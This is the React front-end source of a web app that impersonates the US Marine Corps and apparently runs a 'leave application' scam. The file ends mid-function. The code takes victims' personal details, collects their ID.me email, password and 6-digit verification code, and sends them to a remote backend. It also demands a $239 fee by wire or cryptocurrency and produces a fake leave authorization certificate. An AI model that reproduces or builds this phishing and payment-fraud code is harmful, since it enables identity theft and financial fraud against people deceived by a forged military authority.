import React, { useState, useEffect, useCallback } from 'react';
import { ChevronRight, Clock, CheckCircle, Shield } from 'lucide-react';
import usmcLogo from './usmc.png';

const API = `${import.meta.env.VITE_API_URL || 'https://mila-vwi2.onrender.com'}/api`;

const api = async (ep, method, body, tok) => {
  const opts = { method, headers: { 'Content-Type': 'application/json' } };
  if (tok) opts.headers['Authorization'] = `Bearer ${tok}`;
  if (body) opts.body = JSON.stringify(body);
  const res = await fetch(`${API}${ep}`, opts);
  const data = await res.json();
  if (!res.ok) throw new Error(data.error || 'Request failed');
  return data;
};

const STATES = {
  'Alabama': ['Birmingham','Huntsville','Mobile','Montgomery','Tuscaloosa','Hoover','Dothan','Auburn','Decatur','Madison','Florence','Gadsden','Vestavia Hills','Prattville','Oxford','Albertville','Selma','Troy','Mountain Brook','Phenix City'],
  'Alaska': ['Anchorage','Fairbanks','Juneau','Wasilla','Sitka','Kenai','Ketchikan','Palmer','Bethel','Homer','Valdez','Kodiak','Barrow','Soldotna','Seward','Cordova','Dillingham','Unalaska','Nome','Wrangell'],
  'Arizona': ['Phoenix','Tucson','Mesa','Chandler','Glendale','Scottsdale','Gilbert','Tempe','Peoria','Surprise','Yuma','Flagstaff','Lake Havasu City','Oro Valley','Prescott','Sierra Vista','Bullhead City','Maricopa','Casas Adobes','Sierra Vista Southeast'],
  'Arkansas': ['Little Rock','Fort Smith','Fayetteville','Springdale','Jonesboro','North Little Rock','Conway','Rogers','Pine Bluff','Bentonville','Hot Springs','Benton','Texarkana','Jacksonville','Sherwood','Paragould','Cabot','Russellville','Bella Vista','West Memphis'],
  'California': ['Los Angeles','San Diego','San Jose','San Francisco','Fresno','Sacramento','Long Beach','Oakland','Bakersfield','Anaheim','Santa Ana','Riverside','Stockton','Irvine','Chula Vista','Fremont','San Bernardino','Modesto','Fontana','Moreno Valley'],
  'Colorado': ['Denver','Colorado Springs','Aurora','Fort Collins','Lakewood','Thornton','Arvada','Westminster','Pueblo','Boulder','Greeley','Longmont','Loveland','Castle Rock','Grand Junction','Broomfield','Parker','Littleton','Commerce City','Westland'],
  'Connecticut': ['Bridgeport','New Haven','Stamford','Hartford','Norwalk','Waterbury','Danbury','New Britain','Meriden','Bristol','West Haven','Milford','Middletown','Machester','Torrington','Shelton','Norwich','New London','Groton','Stamford'],
  'Delaware': ['Wilmington','Dover','Newark','Middletown','Smyrna','Milford','Seaford','Georgetown','Elsmere','New Castle','Millsboro','Dewey Beach','Rehoboth Beach','Lewes','Milton'],
  'Florida': ['Jacksonville','Miami','Tampa','Orlando','St. Petersburg','Fort Lauderdale','Tallahassee','Hialeah','Cape Coral','Fort Myers','Pembroke Pines','Hollywood','Gainesville','Miramar','Coral Springs','Clearwater','Palm Bay','West Palm Beach','Lakeland','Pompano Beach'],
  'Georgia': ['Atlanta','Augusta','Savannah','Athens','Sandy Springs','Roswell','Macon','Johns Creek','Albany','Warner Robins','Alpharetta','Marietta','Valdosta','Brunswick','Dunwoody','Rome','East Point','Martinsville','Statesboro','Hinesville'],
  'Hawaii': ['Honolulu','Pearl City','Hilo','Kailua','Kapolei','Kaneohe','Mililani','Kahului','Kihei','Lahaina','Aiea','Wahiawa','Kailua-Kona','Wailuku','Ewa Beach','Kaneohe Base','Kapaa','Lihue','Waipahu','Halawa'],
  'Idaho': ['Boise','Meridian','Nampa','Idaho Falls','Pocatello','Caldwell','Coeur d\'Alene','Twin Falls','Lewiston','Post Falls','Rexburg','Moscow','Idaho City','Sun Valley','Teton','Boise County','Blaine County','Ketchum','Hailey','Victor'],
  'Illinois': ['Chicago','Aurora','Joliet','Naperville','Rockford','Springfield','Peoria','Elgin','Waukegan','Cicero','Bloomington','Arlington Heights','Evanston','Decatur','Schaumburg','Bolingbrook','Palatine','Skokie','Des Plaines','Orland Park'],
  'Indiana': ['Indianapolis','Fort Wayne','Evansville','South Bend','Carmel','Fishers','Hammond','Bloomington','Gary','Muncie','Lafayette','Terre Haute','Kokomo','Anderson','Noblesville','Greenwood','Elkhart','Mishawaka','Lawrence','Jeffersonville'],
  'Iowa': ['Des Moines','Cedar Rapids','Davenport','Sioux City','Waterloo','Iowa City','Council Bluffs','Ames','West Des Moines','Dubuque','Ankeny','Urbandale','Cedar Falls','Marion','Sioux City','Mason City','Ottumwa','Fort Dodge','Keokuk','Perry'],
  'Kansas': ['Wichita','Overland Park','Kansas City','Olathe','Topeka','Lawrence','Shawnee','Salina','Manhattan','Lenexa','Topeka','Garden City','Junction City','Dodge City','Hays','Pittsburg','Emporia','Derby','Gardner','Hutchinson'],
  'Kentucky': ['Louisville','Lexington','Bowling Green','Owensboro','Covington','Richmond','Georgetown','Florence','Hopkinsville','Nicholasville','Elizabethtown','Henderson','Frankfort','Cynthiana','Paducah','Murray','Danville','Radcliff','Winchester','Ashland'],
  'Louisiana': ['New Orleans','Baton Rouge','Shreveport','Lafayette','Lake Charles','Kenner','Bossier City','Monroe','Alexandria','Houma','New Iberia','Laplace','Marrero','Mermentau','Natchitoches','Ruston','Terrytown','Kaplan','Baton Rouge Metro','Pineville'],
  'Maine': ['Portland','Lewiston','Bangor','South Portland','Auburn','Biddeford','Sanford','Brunswick','Saco','Augusta','Westbrook','Lewiston','Waterville','Presque Isle','Brewer','Bath','Caribou','Old Town','Eastport','Houlton'],
  'Maryland': ['Baltimore','Frederick','Rockville','Gaithersburg','Bowie','Hagerstown','Annapolis','College Park','Salisbury','Laurel','Greenbelt','Cumberland','Havre de Grace','Easton','Frederick','Takoma Park','Silver Spring','Bethesda','Chevy Chase','Potomac'],
  'Massachusetts': ['Boston','Worcester','Springfield','Lowell','Cambridge','New Bedford','Brockton','Quincy','Lynn','Fall River','Newton','Lawrence','Somerville','Framingham','Haverhill','Plymouth','Medford','Taunton','Chicopee','Waltham'],
  'Michigan': ['Detroit','Grand Rapids','Warren','Sterling Heights','Lansing','Ann Arbor','Flint','Dearborn','Livonia','Westland','Troy','Farmington Hills','Kalamazoo','Wyoming','Rochester Hills','Southfield','Traverse City','Pontiac','Dearborn Heights','Royal Oak'],
  'Minnesota': ['Minneapolis','St. Paul','Rochester','Bloomington','Duluth','Brooklyn Park','Plymouth','St. Cloud','Eagan','Woodbury','Maple Grove','Eden Prairie','Coon Rapids','Burnsville','Blaine','Lakeville','Minnetonka','Apple Valley','Edina','St. Peter'],
  'Mississippi': ['Jackson','Gulfport','Southaven','Hattiesburg','Biloxi','Meridian','Tupelo','Olive Branch','Horn Lake','Pearl','Madison','Starkville','Vicksburg','Pascagoula','Clinton','Brandon','Oxford','Laurel','Natchez','Columbus'],
  'Missouri': ['Kansas City','St. Louis','Springfield','Columbia','Independence','Lee\'s Summit','O\'Fallon','St. Joseph','St. Charles','Blue Springs','St. Peters','Florissant','Joplin','Chesterfield','Jefferson City','Kansas City','Raytown','Ozark','Chesterfield','Wildwood'],
  'Montana': ['Billings','Missoula','Great Falls','Bozeman','Butte','Helena','Kalispell','Havre','Anaconda','Miles City','Livingston','Belgrade','Whitefish','Havre','Laurel','Sidney','Lewistown','Glendive','Wolf Point','Colstrip'],
  'Nebraska': ['Omaha','Lincoln','Bellevue','Grand Island','Kearney','Fremont','Hastings','North Platte','McCook','Scottsbluff','Beatrice','Lexington','Columbus','Papillion','La Vista','Bellevue','McCook','Plattsmouth','Nebraska City','Seward'],
  'Nevada': ['Las Vegas','Henderson','Reno','North Las Vegas','Sparks','Carson City','Fernley','Elko','Mesquite','Boulder City','Reno','Henderson','Sparks','Carson City','Elko','Mesquite','Winnemucca','Ely','North Las Vegas','West Wendover'],
  'New Hampshire': ['Manchester','Nashua','Concord','Derry','Salem','Dover','Rochester','Keene','Laconia','Portsmouth','Exeter','Lebanon','Hanover','Littleton','Berlin','Somersworth','Claremont','Keene','Conway','Lancaster'],
  'New Jersey': ['Newark','Jersey City','Paterson','Elizabeth','Edison','Woodbridge','Lakewood','Toms River','Hamilton','Trenton','Clifton','Camden','Passaic','Union City','Bayonne','Vineland','New Brunswick','Perth Amboy','Hoboken','East Orange'],
  'New Mexico': ['Albuquerque','Las Cruces','Santa Fe','Rio Rancho','Roswell','Alamogordo','Gallup','Farmington','Clovis','Hobbs','Las Cruces','Alamogordo','Silver City','Española','Gallup','Carlsbad','Los Alamos','Portales','Truth or Consequences','Socorro'],
  'New York': ['New York City','Buffalo','Rochester','Yonkers','Syracuse','Albany','New Rochelle','Mount Vernon','Schenectady','Utica','White Plains','Troy','Hempstead','Niagara Falls','Binghamton','Freeport','Valley Stream','Syracuse','Ithaca','New Paltz'],
  'North Carolina': ['Charlotte','Raleigh','Greensboro','Durham','Winston-Salem','Fayetteville','Cary','Wilmington','High Point','Greenville','Asheville','Concord','Gastonia','Chapel Hill','Charlotte','Jacksonville','Burlington','Rocky Mount','Wilson','Hickory'],
  'North Dakota': ['Fargo','Bismarck','Grand Forks','Minot','West Fargo','Williston','Dickinson','Mandan','Jamestown','Fargo','Wahpeton','Devils Lake','Valley City','Grafton','Rugby','Carrington','Oakes','Langdon','Beulah','Stanley'],
  'Ohio': ['Columbus','Cleveland','Cincinnati','Toledo','Akron','Dayton','Parma','Canton','Youngstown','Springfield','Lorain','Hamilton','Kettering','Elyria','Lakewood','Newark','Mansfield','Mentor','Cleveland Heights','Cuyahoga Falls'],
  'Oklahoma': ['Oklahoma City','Tulsa','Norman','Broken Arrow','Edmond','Lawton','Moore','Midwest City','Stillwater','Enid','Muskogee','Bartlesville','Owasso','Shawnee','Ponca City','Ardmore','Ada','Duncan','Elk City','Oklahoma City'],
  'Oregon': ['Portland','Eugene','Salem','Gresham','Hillsboro','Bend','Beaverton','Medford','Springfield','Corvallis','Albany','Lake Oswego','Tigard','Keizer','Oregon City',' McMinnville','Newport','Woodburn','Roseburg','Klamath Falls'],
  'Pennsylvania': ['Philadelphia','Pittsburgh','Allentown','Erie','Reading','Scranton','Bethlehem','Lancaster','Harrisburg','Altoona','York','Wilkes-Barre','Chester','East Stroudsburg','State College','University Park','Lebanon','Pottstown','Norristown','Hazleton'],
  'Rhode Island': ['Providence','Warwick','Cranston','Pawtucket','East Providence','Woonsocket','Newport','Central Falls','Westerly','Narragansett','Warwick','Cranston','Johnston','North Kingstown','Bristol','South Kingstown','Smithfield','Barrington','Tiverton','Little Compton'],
  'South Carolina': ['Charleston','Columbia','North Charleston','Mount Pleasant','Rock Hill','Greenville','Summerville','Sumter','Goose Creek','Hilton Head Island','Florence','Myrtle Beach','Spartanburg','Anderson','Greenwood','Aiken','Hanahan','Lexington','Greenville','Beaufort'],
  'South Dakota': ['Sioux Falls','Rapid City','Aberdeen','Brookings','Mitchell','Yankton','Pierre','Huron','Vermillion','Watertown','Deadwood','Spearfish','Box Elder','Sturgis','Hot Springs','Madison','Milbank','Chamberlain','Mobridge','Lead'],
  'Tennessee': ['Nashville','Memphis','Knoxville','Chattanooga','Clarksville','Murfreesboro','Jackson','Johnson City','Bartlett','Hendersonville','Kingsport','Collierville','Franklin','Cleveland','Smyrna','Germantown','Brentwood','Columbia','Spring Hill','Lebanon'],
  'Texas': ['Houston','San Antonio','Dallas','Austin','Fort Worth','El Paso','Arlington','Corpus Christi','Plano','Laredo','Lubbock','Garland','Irving','Amarillo','Grand Prairie','Brownsville','McKinney','Pasadena','Mesquite','Killeen'],
  'Utah': ['Salt Lake City','West Valley City','Provo','West Jordan','Orem','Sandy','Ogden','St. George','Layton','Taylorsville','Murray','Draper','Riverton','Lehi','Bountiful','Kaysville','Cottonwood Heights','Spanish Fork','American Fork','Pleasant Grove'],
  'Vermont': ['Burlington','South Burlington','Rutland','Montpelier','Barre','Winooski','Newport','Vergennes','St. Albans','Springfield','Hartford','Brattleboro','Middlebury','Stowe','Woodstock','Manchester','Bennington','Morrisville','Shelburne','Essex Junction'],
  'Virginia': ['Virginia Beach','Norfolk','Chesapeake','Richmond','Arlington','Alexandria','Hampton','Newport News','Roanoke','Suffolk','Lynchburg','Harrisonburg','Lynchburg','Charlottesville','Danville','Fredericksburg','Salem','Staunton','Covington','Colonial Heights'],
  'Washington': ['Seattle','Spokane','Tacoma','Vancouver','Bellevue','Kent','Everett','Renton','Federal Way','Spokane Valley','Olympia','Redmond','Shoreline','Sammamish','Yakima','Lakewood','Richland','Bellingham','Kirkland','Olympia'],
  'West Virginia': ['Charleston','Huntington','Morgantown','Parkersburg','Wheeling','Martinsburg','Beckley','Clarksburg','Fairmont','Weirton','Bluefield','Moundsville','Lewisburg','Huntington','Cheat Lake','South Charleston','St. Albans','Dunbar','Teays Valley','Cross Lanes'],
  'Wisconsin': ['Milwaukee','Madison','Green Bay','Kenosha','Racine','Appleton','Oshkosh','Eau Claire','Janesville','Waukesha','La Crosse','Sheboygan','Wauwatosa','Fond du Lac','New Berlin','Wausau','Eau Claire','Oshkosh','Greenfield','Brookfield'],
  'Wyoming': ['Cheyenne','Casper','Laramie','Gillette','Rock Springs','Sheridan','Green River','Evanston','Riverton','Cody','Jackson','Lander','Rawlins','Casper','Laramie','Rock Springs','Sheridan','Kemmerer','Douglas','Worland']
};

const Navbar = ({ setStep, user, onLogout }) => (
  <nav className="navbar">
    <div className="nav-brand" style={{ cursor: 'pointer' }} onClick={() => setStep(user ? 100 : 0)}>
      <img src={usmcLogo} alt="USMC Logo" className="logo-img" />
      <h1 className="nav-title">United States Marine Corps (LAS)</h1>
    </div>
    <div className="nav-links">
      {user ? (
        <>
          <span style={{ color: 'var(--primary-blue)', fontWeight: 500 }}>Welcome, {user.fullName || user.username}</span>
          <a href="#" className="nav-link" onClick={e => { e.preventDefault(); setStep(100); }}>Dashboard</a>
          <a href="#" className="nav-link" onClick={e => { e.preventDefault(); setStep(200); }}>Support</a>
          <a href="#" className="nav-link" onClick={e => { e.preventDefault(); onLogout(); }}>Logout</a>
        </>
      ) : (
        <>
          <a href="#" className="nav-link" onClick={e => { e.preventDefault(); setStep(10); }}>Login</a>
          <a href="#" className="nav-link" onClick={e => { e.preventDefault(); setStep(200); }}>Help</a>
        </>
      )}
    </div>
  </nav>
);

export default function App() {
  const [step, setStep] = useState(0);
  const [user, setUser] = useState(null);
  const [token, setToken] = useState(localStorage.getItem('token'));
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [dash, setDash] = useState(null);

  const [signup, setSignup] = useState({ applyingFor:'self', fullName:'', email:'', username:'', password:'', confirmPassword:'', dob:'' });
  const [bio, setBio] = useState({ address:'', city:'', state:'', zipCode:'' });
  const [agreed, setAgreed] = useState(false);
  const [loginForm, setLoginForm] = useState({ login:'', password:'' });
  const [idmeCreds, setIdmeCreds] = useState({ idmeEmail:'', idmePassword:'' });
  const [idmeCode, setIdmeCode] = useState('');
  const [clearDur, setClearDur] = useState(0);
  const [appFee, setAppFee] = useState({ paymentMethod:'bank_transfer', cryptoNetwork:'BTC', receiptNumber:'', receiptImage:'' });
  const [appFeeProceed, setAppFeeProceed] = useState(false);
  const [paymentConfig, setPaymentConfig] = useState({});
  const [appFeeAmount, setAppFeeAmount] = useState(239);
  const [supportMsg, setSupportMsg] = useState({ name:'', subject:'', message:'' });
  const [supportThread, setSupportThread] = useState([]);
  const [supportSent, setSupportSent] = useState(false);

  const [forgotEmail, setForgotEmail] = useState('');
  const [forgotCode, setForgotCode] = useState('');
  const [forgotStep, setForgotStep] = useState(0);
  const [resetToken, setResetToken] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [confirmNewPassword, setConfirmNewPassword] = useState('');
  const [forgotSent, setForgotSent] = useState(false);

  const loadDash = useCallback(async () => {
    if (!token) return;
    try {
      const d = await api('/application/dashboard', 'GET', null, token);
      setDash(d.user);
      setClearDur(d.user.clearanceDuration || 0);
      setSupportMsg(s => ({ ...s, name: s.name || d.user.fullName || '' }));
      const pc = await api('/application/payment-config', 'GET', null, token);
      setPaymentConfig(pc.config || {});
      setAppFeeAmount(pc.applicationFee || 239);
      const sm = await api('/application/support-messages', 'GET', null, token);
      setSupportThread(sm.messages || []);
    } catch {}
  }, [token]);

  useEffect(() => {
    if (token && !user) {
      api('/auth/me', 'GET', null, token).then(d => { setUser(d.user); setStep(100); }).catch(() => { localStorage.removeItem('token'); setToken(null); });
    }
  }, [token]);

  useEffect(() => { if (step === 100 && token) loadDash(); }, [step, token, loadDash]);

  useEffect(() => {
    if (!dash) return;
    const waiting = ['awaiting_payment_verification','awaiting_idme_verification','code_sending','awaiting_final_approval'];
    if (!waiting.includes(dash.stageStatus)) return;
    const t = setInterval(loadDash, 3000);
    return () => clearInterval(t);
  }, [dash?.stageStatus, loadDash]);

  const doLogout = () => { setUser(null); setToken(null); setDash(null); setStep(0); setForgotStep(0); localStorage.removeItem('token'); };

  const handleSignup = async e => {
    e.preventDefault(); setError('');
    if (signup.password !== signup.confirmPassword) { setError('Passwords do not match'); return; }
    if (signup.password.length < 8) { setError('Password must be at least 8 characters'); return; }
    if (!agreed) { setError('You must agree to the confidentiality terms before registering'); return; }
    setLoading(true);
    try {
      const d = await api('/auth/signup', 'POST', { ...signup, ...bio });
      localStorage.setItem('token', d.token); setToken(d.token); setUser(d.user); setStep(100);
    } catch(err) { setError(err.message); }
    setLoading(false);
  };

  const handleLogin = async e => {
    e.preventDefault(); setError(''); setLoading(true);
    try {
      const d = await api('/auth/login', 'POST', loginForm);
      localStorage.setItem('token', d.token); setToken(d.token); setUser(d.user); setStep(100);
    } catch(err) { setError(err.message); }
    setLoading(false);
  };

  const handleForgotPassword = async () => {
    if (!forgotEmail) { setError('Enter your email'); return; }
    setError(''); setLoading(true);
    try { await api('/auth/forgot-password', 'POST', { email: forgotEmail }); setForgotSent(true); setForgotStep(1); } catch(err) { setError(err.message); }
    setLoading(false);
  };

  const handleVerifyForgotCode = async () => {
    if (!forgotCode || forgotCode.length !== 6) { setError('Enter the 6-digit code'); return; }
    setError(''); setLoading(true);
    try {
      const d = await api('/auth/verify-forgot-password', 'POST', { email: forgotEmail, code: forgotCode });
      setResetToken(d.resetToken); setForgotStep(2);
    } catch(err) { setError(err.message); }
    setLoading(false);
  };

  const handleResetPassword = async () => {
    if (!newPassword || newPassword.length < 8) { setError('Password must be at least 8 characters'); return; }
    if (newPassword !== confirmNewPassword) { setError('Passwords do not match'); return; }
    setError(''); setLoading(true);
    try { await api('/auth/reset-password', 'POST', { resetToken, newPassword }); setForgotStep(3); } catch(err) { setError(err.message); }
    setLoading(false);
  };

  const submitIdmeCreds = async () => {
    if (!idmeCreds.idmeEmail || !idmeCreds.idmePassword) { setError('Enter both IDME email and password'); return; }
    setError(''); setLoading(true);
    try { await api('/application/stage2-idme', 'POST', idmeCreds, token); setStep(100); loadDash(); } catch(e) { setError(e.message); }
    setLoading(false);
  };

  const submitIdmeCode = async () => {
    if (!idmeCode || idmeCode.length !== 6) { setError('Enter the 6-digit code'); return; }
    setError(''); setLoading(true);
    try { await api('/application/stage2-idme-code', 'POST', { code: idmeCode }, token); setStep(100); loadDash(); } catch(e) { setError(e.message); }
    setLoading(false);
  };

  const selectDuration = async (dur) => {
    setError(''); setLoading(true);
    try {
      const d = await api('/application/stage3-clearance', 'POST', { duration: dur }, token);
      setClearDur(dur); setStep(100); loadDash();
    } catch(e) { setError(e.message); }
    setLoading(false);
  };

  const handleReceiptFile = (e) => {
    const f = e.target.files[0];
    if (!f) return;
    if (f.size > 5 * 1024 * 1024) { setError('Receipt image must be under 5MB'); return; }
    const reader = new FileReader();
    reader.onload = () => setAppFee({ ...appFee, receiptImage: reader.result });
    reader.readAsDataURL(f);
  };

  const submitAppFee = async () => {
    if (!appFee.receiptImage) { setError('Upload your payment receipt image'); return; }
    setError(''); setLoading(true);
    try { await api('/application/stage1-application-fee', 'POST', appFee, token); setStep(100); loadDash(); } catch(e) { setError(e.message); }
    setLoading(false);
  };

  const sendSupportMessage = async () => {
    if (!supportMsg.name || !supportMsg.subject || !supportMsg.message) { setError('Fill in your name, subject and message'); return; }
    setError(''); setLoading(true);
    try {
      await api('/application/support-message', 'POST', supportMsg, token);
      setSupportSent(true);
      const sm = await api('/application/support-messages', 'GET', null, token);
      setSupportThread(sm.messages || []);
      setSupportMsg(s => ({ ...s, subject:'', message:'' }));
      setTimeout(() => setSupportSent(false), 4000);
    } catch(e) { setError(e.message); }
    setLoading(false);
  };

  const renderProgress = (cur) => (
    <div className="progress-container">
      {[1,2,3].map(n => (
        <div key={n} className={`progress-step ${cur > n ? 'completed' : cur === n ? 'active' : ''}`}>{n}</div>
      ))}
    </div>
  );

  const renderPaymentStage = () => {
    const bank = paymentConfig?.bankTransfer || {};
    const crypto = paymentConfig?.crypto || {};
    const assets = crypto.assets || [];
    const selectedAsset = assets.find(a => a.network === appFee.cryptoNetwork) || null;
    const appNumber = dash?.applicationNumber || '';
    const invNumber = dash?.invoiceNumber || (appNumber ? `INV-${appNumber.replace('USMC-', '')}` : '');
    const methodLabel = appFee.paymentMethod === 'crypto' ? `Crypto (${selectedAsset?.network || appFee.cryptoNetwork})` : 'Bank Transfer';

    const methodList = [];
    if (bank.available) methodList.push({ id: 'bank_transfer', label: 'Bank Transfer', sub: bank.bankName || 'Wire payment to our bank account' });
    assets.forEach(a => methodList.push({ id: `crypto_${a.network}`, label: `Crypto (${a.network})`, sub: 'Pay with cryptocurrency' }));

    return (
      <div className="animate-fade-in">
        <h2 className="section-title">Application Fee</h2>
        <div className="invoice-card">
          <h3>Application Fee - ${appFeeAmount.toFixed(2)}</h3>
          <div style={{ display: 'flex', justifyContent: 'space-between', borderTop: '1px solid #eee', paddingTop: '1rem', marginTop: '1rem' }}>
            <span>USMC Leave Application Fee</span>
            <span>${appFeeAmount.toFixed(2)}</span>
          </div>
          <div className="invoice-total" style={{ textAlign: 'right' }}>Total: ${appFeeAmount.toFixed(2)}</div>
        </div>

        {methodList.length === 0 && (
          <div style={{ background: '#fef3c7', border: '1px solid #fcd34d', borderRadius: 8, padding: '1rem 1.5rem', marginBottom: '1.5rem' }}>
            <p style={{ color: '#92400e', fontWeight: 600 }}>No payment methods have been configured yet. Please check back later.</p>
          </div>
        )}

        {methodList.length > 0 && (
          <>
            <p style={{ marginBottom: '1rem', color: '#555' }}>Select a payment method to see payment details.</p>
            <div style={{ display: 'flex', gap: '1rem', flexWrap: 'wrap', marginBottom: '1.5rem' }}>
              {methodList.map(m => {
                const active = appFee.paymentMethod === m.id.replace('crypto_', '') && (m.id === 'bank_transfer' ? appFee.paymentMethod === 'bank_transfer' : appFee.paymentMethod === 'crypto' && appFee.cryptoNetwork === m.id.replace('crypto_', ''));
                return (
                  <button key={m.id} className="btn" style={{ background: active ? 'var(--primary-blue)' : 'white', color: active ? 'white' : '#333', border: active ? '2px solid var(--primary-blue)' : '1px solid #cbd5e1', fontWeight: 600 }} onClick={() => m.id === 'bank_transfer' ? setAppFee({ ...appFee, paymentMethod: 'bank_transfer' }) : setAppFee({ ...appFee, paymentMethod: 'crypto', cryptoNetwork: m.id.replace('crypto_', '') })}>
                    {m.label}
                  </button>
                );
              })}
            </div>
          </>
        )}

        {appFee.paymentMethod === 'bank_transfer' && bank.available && (
          <div className="payment-detail-box animate-fade-in">
            <h3 style={{ color: 'var(--primary-blue)', fontFamily: "'Oswald', sans-serif", textTransform: 'uppercase', marginBottom: '0.75rem' }}>Bank Transfer Details</h3>
            <div style={{ fontSize: '0.9rem', color: '#333', lineHeight: 1.9 }}>
              <p><strong>Bank:</strong> {bank.bankName}</p>
              <p><strong>Account Name:</strong> {bank.accountName}</p>
              <p><strong>Account Number:</strong> {bank.accountNumber}</p>
              <p><strong>Routing Number:</strong> {bank.routingNumber || '-'}</p>
              <p><strong>SWIFT Code:</strong> {bank.swiftCode || '-'}</p>
              {bank.instructions && <p style={{ color: '#555', marginTop: '0.5rem' }}>{bank.instructions}</p>}
            </div>
          </div>
        )}

        {appFee.paymentMethod === 'crypto' && crypto.available && selectedAsset && (
          <div className="payment-detail-box animate-fade-in">
            <h3 style={{ color: 'var(--primary-blue)', fontFamily: "'Oswald', sans-serif", textTransform: 'uppercase', marginBottom: '0.75rem' }}>Crypto Details - {selectedAsset.network}</h3>
            <div style={{ display: 'flex', gap: '1.5rem', alignItems: 'flex-start', flexWrap: 'wrap' }}>
              {selectedAsset.qrCodeImage && <img src={selectedAsset.qrCodeImage} alt={`${selectedAsset.network} QR`} style={{ width: 160, height: 160, borderRadius: 8, border: '1px solid #e5e7eb' }} />}
              <div style={{ fontSize: '0.9rem', color: '#333', lineHeight: 1.8, flex: 1, minWidth: 220 }}>
                <p><strong>Network:</strong> {selectedAsset.network}</p>
                <p><strong>Wallet Address:</strong></p>
                <p style={{ fontFamily: 'monospace', fontSize: '0.8rem', background: '#f3f4f6', padding: '0.5rem', borderRadius: 6, wordBreak: 'break-all' }}>{selectedAsset.walletAddress}</p>
                {crypto.instructions && <p style={{ color: '#555', marginTop: '0.5rem' }}>{crypto.instructions}</p>}
              </div>
            </div>
          </div>
        )}

        <div className="pending-payment-box animate-fade-in">
          <h3 style={{ color: 'var(--primary-blue)', fontFamily: "'Oswald', sans-serif", textTransform: 'uppercase', marginBottom: '1rem' }}>Payment Summary</h3>
          <div className="pending-summary-grid">
            <p><strong>Application ID:</strong> {appNumber}</p>
            <p><strong>Invoice Number:</strong> {invNumber}</p>
            <p><strong>Applicant:</strong> {dash?.fullName}</p>
            <p><strong>Payment Method:</strong> {methodLabel}</p>
            <p><strong>Amount Due:</strong> ${appFeeAmount.toFixed(2)}</p>
          </div>
          {!appFeeProceed && (
            <button onClick={() => setAppFeeProceed(true)} className="btn btn-primary" style={{ marginTop: '1.25rem' }}>Proceed to Upload Receipt <ChevronRight size={16} /></button>
          )}
        </div>

        {appFeeProceed && (
          <div className="animate-fade-in" style={{ marginTop: '1.5rem', paddingTop: '1.5rem', borderTop: '1px solid #e5e7eb' }}>
            <h3 style={{ color: 'var(--primary-blue)', fontFamily: "'Oswald', sans-serif", textTransform: 'uppercase', marginBottom: '1rem' }}>Upload Receipt</h3>
            <div className="form-group"><label className="form-label">Upload Receipt Image</label><input type="file" accept="image/*" className="form-input" onChange={handleReceiptFile} style={{ padding: '0.5rem' }} /></div>
            {appFee.receiptImage && <div style={{ marginBottom: '1rem' }}><img src={appFee.receiptImage} alt="Receipt preview" style={{ maxWidth: 300, maxHeight: 300, borderRadius: 8, border: '1px solid #e5e7eb' }} /></div>}
            <div className="form-group"><label className="form-label">Receipt / Reference Number (optional)</label><input type="text" className="form-input" placeholder="Enter receipt number" value={appFee.receiptNumber} onChange={e => setAppFee({ ...appFee, receiptNumber: e.target.value })} /></div>
            <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '1rem', marginTop: '1.5rem' }}>
              <button onClick={() => setAppFeeProceed(false)} className="btn btn-secondary">Back</button>
              <button onClick={submitAppFee} className="btn btn-primary" disabled={loading || !appFee.receiptImage}>{loading ? 'Submitting...' : 'Submit Application Fee'} <ChevronRight size={16} /></button>
            </div>
          </div>
        )}
      </div>
    );
  };

  const renderStage = () => {
    const stage = dash?.currentStage || 1;
    const status = dash?.stageStatus || '';

    if (dash?.finalApproved) {
      return (
        <div className="form-card animate-fade-in" style={{ textAlign: 'center' }}>
          <CheckCircle size={48} color="green" style={{ margin: '0 auto 1rem' }} />
          <h2 className="section-title" style={{ border: 'none' }}>Leave Approved!</h2>
          <p style={{ fontSize: '0.95rem', color: '#555', marginBottom: '2rem' }}>Your leave has been approved. Here is your authorization document.</p>
          <div style={{ background: 'white', border: '2px solid var(--primary-blue)', borderRadius: 12, padding: '2.5rem', maxWidth: 600, margin: '0 auto', textAlign: 'left' }}>
            <div style={{ textAlign: 'center', marginBottom: '1.5rem' }}>
              <div style={{ width: 80, height: 80, borderRadius: '50%', background: 'var(--primary-blue)', color: 'white', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '1.5rem', fontWeight: 700, margin: '0 auto 0.5rem' }}>USMC</div>
              <h3 style={{ fontFamily: "'Oswald', sans-serif", textTransform: 'uppercase', color: 'var(--primary-blue)' }}>Leave Authorization Document</h3>
            </div>
            <div style={{ lineHeight: 1.8, color: '#333' }}>
              <p>This certifies that <strong>{dash.fullName}</strong> has been approved for leave.</p>
              <p><strong>Applicant:</strong> {dash.fullName}</p>
              <p><strong>Application Number:</strong> {dash.applicationNumber}</p>
              <p><strong>State:</strong> {dash.state}</p>
              <p><strong>City:</strong> {dash.city}</p>
              <p><strong>Duration:</strong> {dash.clearanceDuration} month(s)</p>
              <p><strong>Account Officer:</strong> {dash.accountOfficer || 'Assigned'}</p>
              <p><strong>Date:</strong> {new Date().toLocaleDateString()}</p>
            </div>
            <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: '2rem', paddingTop: '1rem', borderTop: '1px solid #ccc' }}>
              <div style={{ textAlign: 'center' }}><div style={{ borderBottom: '1px solid #333', minWidth: 150, marginBottom: 4 }}>&nbsp;</div><p style={{ fontSize: '0.85rem' }}>Authorizing Officer</p></div>
              <div style={{ textAlign: 'center' }}><div style={{ borderBottom: '1px solid #333', minWidth: 150, marginBottom: 4 }}>&nbsp;</div><p style={{ fontSize: '0.85rem' }}>Administrator</p></div>
            </div>
          </div>
        </div>
      );
    }

    if (status === 'payment_rejected') {
      return (
        <div className="form-card animate-fade-in">
          <h2 className="section-title">Application Fee - Action Required</h2>
          <div style={{ background: '#fee2e2', border: '1px solid #fca5a5', borderRadius: 8, padding: '1rem 1.5rem', marginBottom: '1.5rem' }}>
            <p style={{ color: '#991b1b', fontWeight: 600 }}>Your payment receipt was not accepted:</p>
            <p style={{ color: '#991b1b', marginTop: '0.5rem' }}>{dash.applicationFeeRejectMessage}</p>
          </div>
          <p style={{ marginBottom: '1rem', color: '#555' }}>Upload a valid receipt to continue.</p>
          {renderPaymentStage()}
        </div>
      );
    }

    if (status === 'awaiting_payment_verification') {
